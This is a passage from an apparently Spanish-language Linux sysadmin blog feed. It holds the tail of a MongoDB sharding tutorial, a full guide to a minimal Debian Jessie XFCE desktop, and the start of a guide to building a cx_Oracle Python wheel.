&lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;shardAdded&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;lyra&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;ok&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
mongos&amp;gt; sh.addShard&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;cygnus/mongo06:27018&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;shardAdded&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;cygnus&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;ok&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
mongos&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Después de añadir los &lt;em&gt;shards&lt;/em&gt;, podemos ver como queda el &lt;em&gt;cluster&lt;/em&gt; con una sola consulta.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;mongos&amp;gt; printShardingStatus&lt;span class="o"&gt;()&lt;/span&gt;
--- Sharding Status ---
  sharding version: &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;_id&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;minCompatibleVersion&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;5&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;currentVersion&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;6&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;clusterId&amp;quot;&lt;/span&gt; : ObjectId&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;571dd47adbda7a5a80047a5d&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
  shards:
        &lt;span class="o"&gt;{&lt;/span&gt;  &lt;span class="s2"&gt;&amp;quot;_id&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;aquila&amp;quot;&lt;/span&gt;,  &lt;span class="s2"&gt;&amp;quot;host&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;aquila/mongo01:27018,mongo04:27018&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
        &lt;span class="o"&gt;{&lt;/span&gt;  &lt;span class="s2"&gt;&amp;quot;_id&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;cygnus&amp;quot;&lt;/span&gt;,  &lt;span class="s2"&gt;&amp;quot;host&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;cygnus/mongo03:27018,mongo06:27018&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
        &lt;span class="o"&gt;{&lt;/span&gt;  &lt;span class="s2"&gt;&amp;quot;_id&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;lyra&amp;quot;&lt;/span&gt;,  &lt;span class="s2"&gt;&amp;quot;host&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;lyra/mongo02:27018,mongo05:27018&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
  active mongoses:
        &lt;span class="s2"&gt;&amp;quot;3.2.5&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt;
  balancer:
        Currently enabled:  yes
        Currently running:  no
        Failed balancer rounds in last &lt;span class="m"&gt;5&lt;/span&gt; attempts:  &lt;span class="m"&gt;0&lt;/span&gt;
        Migration Results &lt;span class="k"&gt;for&lt;/span&gt; the last &lt;span class="m"&gt;24&lt;/span&gt; hours:
                No recent migrations
  databases:

mongos&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y como todo funciona como debe, salimos del &lt;em&gt;mongo shell&lt;/em&gt; para evitar meter la pata.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;mongos&amp;gt; &lt;span class="nb"&gt;exit&lt;/span&gt;
bye
root@mongo01:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto, tenemos nuestro &lt;em&gt;cluster&lt;/em&gt; listo y preparado para su uso.&lt;/p&gt;</content><category term="linux"></category><category term="debian"></category><category term="jessie"></category><category term="mongodb"></category><category term="replica set"></category><category term="sharding"></category><category term="ansible"></category><category term="playbook"></category><category term="systemd"></category></entry><entry><title>Un escritorio mínimo con Debian</title><link href="http://www.linuxsysadmin.ml/2016/04/un-escritorio-minimo-con-debian.html" rel="alternate"></link><published>2016-04-25T08:00:00+02:00</published><updated>2016-04-25T08:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-04-25:/2016/04/un-escritorio-minimo-con-debian.html</id><summary type="html">&lt;p&gt;Harto de distribuciones para escritorio cargados con aplicaciones que no se usan, decidí que esta vez iba a instalar un escritorio de trabajo partiendo de una &lt;em&gt;Debian netinstall&lt;/em&gt;. El resto va a ser instalar las aplicaciones justas y necesarias para nuestro trabajo diario. En este artículo describo como lo hice …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Harto de distribuciones para escritorio cargados con aplicaciones que no se usan, decidí que esta vez iba a instalar un escritorio de trabajo partiendo de una &lt;em&gt;Debian netinstall&lt;/em&gt;. El resto va a ser instalar las aplicaciones justas y necesarias para nuestro trabajo diario. En este artículo describo como lo hice.&lt;/p&gt;
&lt;p&gt;Este tutorial se asume que ya tenemos la distribución instalada de una forma mínima, sin nada que sea innecesario. Vamos a instalar los paquetes que se necesiten para nuestro escritorio.&lt;/p&gt;
&lt;p&gt;Para practicar la instalación y probar variaciones, es recomendable hacerlo en una máquina virtual, por ejemplo, usando &lt;strong&gt;VirtualBox&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;En cuanto a los requisitos, vamos a partir de una distribución &lt;em&gt;Debian Jessie&lt;/em&gt; normal, con una cantidad de memoria tirando a poca, y con un disco también bastante escaso. El resultado es bastante ligero.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@kobayashi-maru:~# cat /etc/debian_version
&lt;span class="m"&gt;8&lt;/span&gt;.4
root@kobayashi-maru:~# free -m
             total       used       free     shared    buffers     cached
Mem:           &lt;span class="m"&gt;500&lt;/span&gt;         &lt;span class="m"&gt;65&lt;/span&gt;        &lt;span class="m"&gt;435&lt;/span&gt;          &lt;span class="m"&gt;4&lt;/span&gt;          &lt;span class="m"&gt;6&lt;/span&gt;         &lt;span class="m"&gt;34&lt;/span&gt;
-/+ buffers/cache:         &lt;span class="m"&gt;23&lt;/span&gt;        &lt;span class="m"&gt;476&lt;/span&gt;
Swap:            &lt;span class="m"&gt;0&lt;/span&gt;          &lt;span class="m"&gt;0&lt;/span&gt;          &lt;span class="m"&gt;0&lt;/span&gt;
root@kobayashi-maru:~# df -h
S.ficheros     Tamaño Usados  Disp Uso% Montado en
/dev/sda1        &lt;span class="m"&gt;4&lt;/span&gt;,0G   600M  &lt;span class="m"&gt;3&lt;/span&gt;,2G  &lt;span class="m"&gt;16&lt;/span&gt;% /
udev              10M      &lt;span class="m"&gt;0&lt;/span&gt;   10M   &lt;span class="m"&gt;0&lt;/span&gt;% /dev
tmpfs            101M   &lt;span class="m"&gt;4&lt;/span&gt;,4M   96M   &lt;span class="m"&gt;5&lt;/span&gt;% /run
tmpfs            251M      &lt;span class="m"&gt;0&lt;/span&gt;  251M   &lt;span class="m"&gt;0&lt;/span&gt;% /dev/shm
tmpfs            &lt;span class="m"&gt;5&lt;/span&gt;,0M      &lt;span class="m"&gt;0&lt;/span&gt;  &lt;span class="m"&gt;5&lt;/span&gt;,0M   &lt;span class="m"&gt;0&lt;/span&gt;% /run/lock
tmpfs            251M      &lt;span class="m"&gt;0&lt;/span&gt;  251M   &lt;span class="m"&gt;0&lt;/span&gt;% /sys/fs/cgroup
root@kobayashi-maru:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Las buenas prácticas requieren separar algunas de las carpetas en particiones distintas, de forma que el disco raíz no se llene por el uso diario de los usuarios. Especialmente se recomienda asignar una partición o disco para la carpeta &lt;em&gt;/home/&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;El sistema de ventanas&lt;/h2&gt;
&lt;p&gt;Como primer paso, necesitamos el servidor de ventanas, que se encarga de mediar entre los &lt;em&gt;drivers&lt;/em&gt; y las aplicaciones. En la distribución utilizada, se utiliza &lt;strong&gt;xorg&lt;/strong&gt; para esta función.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@kobayashi-maru:~# apt-get install xorg
...
root@kobayashi-maru:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Esto nos va a instalar el servidor, y gracias al sistema de dependencias de &lt;em&gt;Debian&lt;/em&gt;, todos los drivers de entrada y de vídeo; esto añade muchos paquetes que seguramente no usaremos jamás, que necesitan irse actualizando y ocupan espacio en disco. En caso de querer reducir la cantidad de drivers instalados, y sabiendo los que necesitamos, podemos instalar los necesarios solamente.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@kobayashi-maru:~# apt-get install xserver-xorg xserver-xorg-input-kbd xserver-xorg-input-mouse xserver-xorg-video-vesa
...
root@kobayashi-maru:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este caso, yo opté por este sistema, instalando el &lt;em&gt;driver&lt;/em&gt; de vídeo &lt;em&gt;vesa&lt;/em&gt;, que es el que funciona con &lt;strong&gt;VirtualBox&lt;/strong&gt; (este &lt;em&gt;driver&lt;/em&gt; funciona siempre). En el caso de mi ordenador, puse el &lt;em&gt;driver&lt;/em&gt; de vídeo &lt;em&gt;intel&lt;/em&gt; (que es la tarjeta gráfica que tengo) y añadí el &lt;em&gt;driver&lt;/em&gt; de entrada &lt;em&gt;synaptics&lt;/em&gt; (que gestiona el &lt;em&gt;touchpad&lt;/em&gt;).&lt;/p&gt;
&lt;h2&gt;El entorno de escritorio&lt;/h2&gt;
&lt;p&gt;En este apartado tenemos muchas posibilidades; el ecosistema de entornos de escritorio es grande, pudiendo elegir entre &lt;em&gt;GNOME&lt;/em&gt;, &lt;em&gt;KDE&lt;/em&gt;, &lt;em&gt;XFCE&lt;/em&gt;, &lt;em&gt;LXDE&lt;/em&gt; y otros tantos.&lt;/p&gt;
&lt;p&gt;Un entorno de escritorio que me gusta por su simplicidad es &lt;em&gt;LXDE&lt;/em&gt;, que se puede instalar con el paquete &lt;strong&gt;lxde&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@kobayashi-maru:~# apt-get install lxde
...
root@kobayashi-maru:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En caso de no necesitar todos los paquetes, es posible instalar un conjunto menor de paquetes. Una selección bastante completa podría ser la siguiente:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@kobayashi-maru:~# apt-get install lxde-core lxappearance lxterminal lxtask
...
root@kobayashi-maru:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Sin embargo, este entorno de escritorio está muy limitado en cuando a herramientas de configuración, y yo preferí instalar &lt;em&gt;XFCE&lt;/em&gt;, que conseguí con los paquetes &lt;strong&gt;xfce4&lt;/strong&gt; y &lt;strong&gt;xfce4-goodies&lt;/strong&gt; (opcional; incluye algunos &lt;em&gt;plugins&lt;/em&gt; y aplicaciones extras).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@kobayashi-maru:~# apt-get install xfce4 xfce4-goodies
...
root@kobayashi-maru:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Cargar el modo gráfico&lt;/h2&gt;
&lt;p&gt;El primer método consiste en trabajar en modo terminal, levantando manualmente el entorno gráfico invocando el comando &lt;strong&gt;startx&lt;/strong&gt;, que se encuentra en el paquete &lt;strong&gt;xinit&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@kobayashi-maru:~# apt-get install xinit
...
root@kobayashi-maru:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Esto no es cómodo para el usuario corriente; lo normal es tener una pantalla de &lt;em&gt;login&lt;/em&gt; para entrar en la sesión de escritorio. Nuevamente hay muchas alternativas, pero en nuestro caso hemos optado por poner el paquete &lt;strong&gt;lightdm&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@kobayashi-maru:~# apt-get install lightdm
...
root@kobayashi-maru:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Otras utilidades&lt;/h2&gt;
&lt;p&gt;Dependiendo del uso que vayamos a hacer, es interesante que nuestro ordenador pueda reproducir sonidos y tenga un gestor de redes, tanto cableadas como &lt;em&gt;wifi&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;El primero consiste en usar &lt;em&gt;ALSA&lt;/em&gt;, y detectar la configuración de nuestro sonido, guardando dicha configuración para futuros reinicios de la máquina.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@kobayashi-maru:~# apt-get install alsa-utils
...
root@kobayashi-maru:~# alsactl init
Found hardware: &lt;span class="s2"&gt;&amp;quot;ICH&amp;quot;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SigmaTel STAC9700,83,84&amp;quot;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;AC97a:83847600&amp;quot;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;0x8086&amp;quot;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;0x0000&amp;quot;&lt;/span&gt;
Hardware is initialized using a generic method
root@kobayashi-maru:~# alsactl store
root@kobayashi-maru:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para la parte del gestor de redes, hay nuevamente debate. Uno que me gusta y que cumple bien con su función es &lt;strong&gt;wicd&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@kobayashi-maru:~# apt-get install wicd
...
root@kobayashi-maru:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Las aplicaciones&lt;/h2&gt;
&lt;p&gt;Las aplicaciones a instalar son un tema muy personal; cada usuario va a necesitar unos tipos de aplicaciones u otras. Incluso así, de las aplicaciones de un tipo dado, pueden haber diversas opciones.&lt;/p&gt;
&lt;p&gt;Estas aplicaciones se pueden ir instalando a &lt;em&gt;posteriori&lt;/em&gt;, tal como se vayan necesitando. Sin embargo, podemos poner aquellas que se van a usar seguro, como un navegador web, por ejemplo &lt;em&gt;Chromium&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@kobayashi-maru:~# apt-get install chromium
...
root@kobayashi-maru:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y para los fans de &lt;em&gt;Firefox&lt;/em&gt;, también hay su alternativa:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@kobayashi-maru:~# apt-get install iceweasel
...
root@kobayashi-maru:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Y finalmente, la magia&lt;/h2&gt;
&lt;p&gt;Podemos limpiar los paquetes descargados e instalados, mediante un &lt;em&gt;clean&lt;/em&gt; simple de &lt;strong&gt;apt-get&lt;/strong&gt;. Esto liberará algunos &lt;em&gt;megas&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@kobayashi-maru:~# apt-get clean
root@kobayashi-maru:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Rebotamos nuestro ordenador, y dejamos que lo instalado tome el control del &lt;em&gt;boot&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@kobayashi-maru:~# reboot
...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Iremos a parar a la pantalla de &lt;em&gt;login&lt;/em&gt;, y con un usuario adecuado deberíamos ver nuestro escritorio, tal como se muestra.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Escritorio XFCE" src="http://www.linuxsysadmin.ml/images/escritorio-xfce.jpg"&gt;&lt;/p&gt;
&lt;p&gt;Ahora es tarea del usuario tunear el escritorio a su gusto, con paneles, &lt;em&gt;plugins&lt;/em&gt; y &lt;em&gt;wallpapers&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Un apunte sobre los recursos&lt;/h2&gt;
&lt;p&gt;Tras instalar todos los componentes, vemos que los recursos apenas han subido; lo que nos da una idea del tipo de &lt;em&gt;hardware&lt;/em&gt; que podemos usar.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@kobayashi-maru:~$ df -h
S.ficheros     Tamaño Usados  Disp Uso% Montado en
/dev/sda1        &lt;span class="m"&gt;4&lt;/span&gt;,0G   &lt;span class="m"&gt;1&lt;/span&gt;,4G  &lt;span class="m"&gt;2&lt;/span&gt;,5G  &lt;span class="m"&gt;36&lt;/span&gt;% /
udev              10M      &lt;span class="m"&gt;0&lt;/span&gt;   10M   &lt;span class="m"&gt;0&lt;/span&gt;% /dev
tmpfs            101M   &lt;span class="m"&gt;4&lt;/span&gt;,4M   96M   &lt;span class="m"&gt;5&lt;/span&gt;% /run
tmpfs            251M      &lt;span class="m"&gt;0&lt;/span&gt;  251M   &lt;span class="m"&gt;0&lt;/span&gt;% /dev/shm
tmpfs            &lt;span class="m"&gt;5&lt;/span&gt;,0M   &lt;span class="m"&gt;4&lt;/span&gt;,0K  &lt;span class="m"&gt;5&lt;/span&gt;,0M   &lt;span class="m"&gt;1&lt;/span&gt;% /run/lock
tmpfs            251M      &lt;span class="m"&gt;0&lt;/span&gt;  251M   &lt;span class="m"&gt;0&lt;/span&gt;% /sys/fs/cgroup
tmpfs             51M   &lt;span class="m"&gt;4&lt;/span&gt;,0K   51M   &lt;span class="m"&gt;1&lt;/span&gt;% /run/user/110
tmpfs             51M   &lt;span class="m"&gt;4&lt;/span&gt;,0K   51M   &lt;span class="m"&gt;1&lt;/span&gt;% /run/user/1000
gerard@kobayashi-maru:~$ free -m
             total       used       free     shared    buffers     cached
Mem:           &lt;span class="m"&gt;500&lt;/span&gt;        &lt;span class="m"&gt;238&lt;/span&gt;        &lt;span class="m"&gt;262&lt;/span&gt;          &lt;span class="m"&gt;5&lt;/span&gt;         &lt;span class="m"&gt;15&lt;/span&gt;        &lt;span class="m"&gt;125&lt;/span&gt;
-/+ buffers/cache:         &lt;span class="m"&gt;96&lt;/span&gt;        &lt;span class="m"&gt;404&lt;/span&gt;
Swap:            &lt;span class="m"&gt;0&lt;/span&gt;          &lt;span class="m"&gt;0&lt;/span&gt;          &lt;span class="m"&gt;0&lt;/span&gt;
gerard@kobayashi-maru:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El disco ha aumentado en unos 900 mb y la memoria ha pasado de 23 a 96 mb, sin tener ninguna aplicación abierta.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CUIDADO&lt;/strong&gt;: Algunas aplicaciones necesitan mucho disco y también memoria. Depende de lo que se ponga, podemos pasar de unos requerimientos &lt;em&gt;hardware&lt;/em&gt; austeros, a una máquina que dejaría de juguete a un supercomputador...&lt;/p&gt;
&lt;p&gt;Para el uso que doy de mi &lt;em&gt;netbook&lt;/em&gt; (navegar, redacción de artículos, programación de &lt;em&gt;scripts&lt;/em&gt; y alguna sesión de &lt;em&gt;SSH&lt;/em&gt;), los 2gb de memoria me sobran; con 128 mb tendría suficiente.&lt;/p&gt;</content><category term="linux"></category><category term="debian"></category><category term="jessie"></category><category term="escritorio"></category><category term="xfce"></category></entry><entry><title>Consultando una base de datos Oracle en python</title><link href="http://www.linuxsysadmin.ml/2016/04/consultando-una-base-de-datos-oracle-en-python.html" rel="alternate"></link><published>2016-04-18T08:00:00+02:00</published><updated>2016-04-18T08:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-04-18:/2016/04/consultando-una-base-de-datos-oracle-en-python.html</id><summary type="html">&lt;p&gt;El otro día estuve optimizando unos &lt;em&gt;scripts&lt;/em&gt; hechos en &lt;em&gt;bash&lt;/em&gt; que había hecho otro. Como resultado del lenguaje usado era un caos de comandos, muchos de ellos para limpiar la salida y darle la forma adecuada. Los reescribí en &lt;em&gt;python&lt;/em&gt; usando la librería &lt;strong&gt;cx_Oracle&lt;/strong&gt;, que compilé en un fichero &lt;em&gt;wheel …&lt;/em&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;El otro día estuve optimizando unos &lt;em&gt;scripts&lt;/em&gt; hechos en &lt;em&gt;bash&lt;/em&gt; que había hecho otro. Como resultado del lenguaje usado era un caos de comandos, muchos de ellos para limpiar la salida y darle la forma adecuada. Los reescribí en &lt;em&gt;python&lt;/em&gt; usando la librería &lt;strong&gt;cx_Oracle&lt;/strong&gt;, que compilé en un fichero &lt;em&gt;wheel&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;El mayor problema al que te enfrentas si intentas instalar una librería &lt;em&gt;python&lt;/em&gt; que no está en la librería estándar, es que debes usar el gestor de paquetes, previo uso del usuario &lt;strong&gt;root&lt;/strong&gt;. Y eso no siempre es posible.&lt;/p&gt;
&lt;p&gt;Así que para hacer una instalación en mi carpeta personal, me decanté por crear un &lt;strong&gt;virtualenv&lt;/strong&gt; en donde se iba a instalar una &lt;em&gt;wheel&lt;/em&gt; precompilada en una máquina similar. Lo documento para tenerlo a mano.&lt;/p&gt;
&lt;p&gt;Voy a explicar dos procedimientos: el primero es como instalar el &lt;em&gt;package&lt;/em&gt; en una máquina que tenga herramientas de compilación y como empaquetarlo en un fichero &lt;em&gt;wheel&lt;/em&gt;; el segundo consiste en instalar la &lt;em&gt;wheel&lt;/em&gt; localmente en la máquina que la va a usar, a modo de &lt;em&gt;runtime&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Para seguir esta guía, necesitamos una máquina con &lt;strong&gt;Linux&lt;/strong&gt; cualquiera, que en mi caso ha sido una &lt;strong&gt;Debian Jessie&lt;/strong&gt;. Estos son los paquetes necesarios como requisitos:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;unzip&lt;/li&gt;
&lt;li&gt;python&lt;/li&gt;
&lt;li&gt;libaio1&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;En la máquina en donde se vaya a crear la &lt;em&gt;wheel&lt;/em&gt;, también serán necesarios los siguientes:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;python-dev&lt;/li&gt;
&lt;li&gt;gcc&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Adicionalmente, se necesita descargar el &lt;a href="https://www.oracle.com/downloads/index.html"&gt;Oracle instant client&lt;/a&gt;, concretamente el &lt;strong&gt;basic&lt;/strong&gt; y, en caso de la construcción de la &lt;em&gt;wheel&lt;/em&gt;, también el &lt;strong&gt;sdk&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@oracle:~# ls -1
instantclient-basic-linux-12.1.0.2.0.zip
instantclient-sdk-linux-12.1.0.2.0.zip
root@oracle:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Construyendo el fichero wheel&lt;/h2&gt;
&lt;p&gt;El primer paso consiste en descomprimir el &lt;em&gt;instant client&lt;/em&gt; de Oracle, necesario para cualquier programa que intente conectarse a sus bases de datos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@oracle:~# unzip instantclient-basic-linux-12.1.0.2.0.zip
Archive:  instantclient-basic-linux-12.1.0.2.0.zip
  inflating: instantclient_12_1/adrci
  inflating: instantclient_12_1/BASIC_README
  inflating: instantclient_12_1/genezi
  inflating: instantclient_12_1/libclntshcore.so.12.1
  inflating: instantclient_12_1/libclntsh.so.12.1
  inflating: instantclient_12_1/libnnz12.so
  inflating: instantclient_12_1/libocci.so.12.1
  inflating: instantclient_12_1/libociei.so
  inflating: instantclient_12_1/libocijdbc12.so
  inflating: instantclient_12_1/libons.so
  inflating: instantclient_12_1/liboramysql12.so
  inflating: instantclient_12_1/ojdbc6.jar
  inflating: instantclient_12_1/ojdbc7.jar
  inflating: instantclient_12_1/uidrvci
  inflating: instantclient_12_1/xstreams.jar
root@oracle:~# unzip instantclient-sdk-linux-12.1.0.2.0.zip
Archive:  instantclient-sdk-linux-12.1.0.2.0.zip
   creating: instantclient_12_1/sdk/
   creating: instantclient_12_1/sdk/include/
  inflating: instantclient_12_1/sdk/include/oratypes.h
  inflating: instantclient_12_1/sdk/include/occi.h
  inflating: instantclient_12_1/sdk/include/ocikpr.h
  inflating: instantclient_12_1/sdk/include/odci.h
  inflating: instantclient_12_1/sdk/include/xa.h
  inflating: instantclient_12_1/sdk/include/ldap.h
  inflating: instantclient_12_1/sdk/include/oci.h
  inflating: instantclient_12_1/sdk/include/ocidfn.h
  inflating: instantclient_12_1/sdk/include/oci1.h
  inflating: instantclient_12_1/sdk/include/ort.h
  inflating: instantclient_12_1/sdk/include/ociextp.h
  inflating: instantclient_12_1/sdk/include/occiAQ.h
  inflating: instantclient_12_1/sdk/include/ori.h
  inflating: instantclient_12_1/sdk/include/nzerror.h
  inflating: instantclient_12_1/sdk/include/ocixmldb.h
  inflating: instantclient_12_1/sdk/include/ocidef.h
  inflating: instantclient_12_1/sdk/include/occiControl.h
  inflating: instantclient_12_1/sdk/include/ocidem.h
  inflating: instantclient_12_1/sdk/include/nzt.h
  inflating: instantclient_12_1/sdk/include/orid.h
  inflating: instantclient_12_1/sdk/include/ociap.h
  inflating: instantclient_12_1/sdk/include/orl.h
  inflating: instantclient_12_1/sdk/include/ocixstream.h
  inflating: instantclient_12_1/sdk/include/occiObjects.h
  inflating: instantclient_12_1/sdk/include/oci8dp.h
  inflating: instantclient_12_1/sdk/include/oro.h
  inflating: instantclient_12_1/sdk/include/occiCommon.h
  inflating: instantclient_12_1/sdk/include/ociapr.h
  inflating: instantclient_12_1/sdk/include/occiData.h
   creating: instantclient_12_1/sdk/admin/
  inflating: instantclient_12_1/sdk/admin/oraaccess.xsd
 extracting: instantclient_12_1/sdk/ottclasses.zip
   creating: instantclient_12_1/sdk/demo/
  inflating: instantclient_12_1/sdk/demo/occidemo.sql
  inflating: instantclient_12_1/sdk/demo/oraaccess.xml
  inflating: instantclient_12_1/sdk/demo/occiobj.cpp
  inflating: instantclient_12_1/sdk/demo/occidemod.sql
  inflating: instantclient_12_1/sdk/demo/occidml.cpp
  inflating: instantclient_12_1/sdk/demo/occiobj.typ
  inflating: instantclient_12_1/sdk/demo/setuporamysql.sh
  inflating: instantclient_12_1/sdk/demo/cdemo81.c
  inflating: instantclient_12_1/sdk/demo/demo.mk
  inflating: instantclient_12_1/sdk/ott
  inflating: instantclient_12_1/sdk/SDK_README
root@oracle:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para que el sistema sepa donde lo hemos descomprimido, hay que definir la variable de entorno &lt;strong&gt;ORACLE_HOME&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@oracle:~# &lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;ORACLE_HOME&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/root/instantclient_12_1/
root@oracle:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La compilación de las librerías contenidas en el &lt;em&gt;package&lt;/em&gt; &lt;strong&gt;cx_Oracle&lt;/strong&gt; tiene un error y busca una librería llamada &lt;em&gt;libclntsh.so&lt;/em&gt;, que no se llama así en el &lt;em&gt;runtime&lt;/em&gt;. Se puede evitar el problema copiando la librería con el nuevo nombre, o mediante un enlace simbólico.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@oracle:~# &lt;span class="nb"&gt;cd&lt;/span&gt; instantclient_12_1/
root@oracle:~/instantclient_12_1# ln -s libclntsh.so.12.1 libclntsh.so
root@oracle:~/instantclient_12_1# &lt;span class="nb"&gt;cd&lt;/span&gt; ..
root@oracle:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto ya podemos empezar. Creamos un &lt;strong&gt;virtualenv&lt;/strong&gt; que nos va a servir como plataforma de construcción del fichero &lt;em&gt;wheel&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@oracle:~# virtualenv env
New python executable in /root/env/bin/python
Installing setuptools, pip, wheel...done.
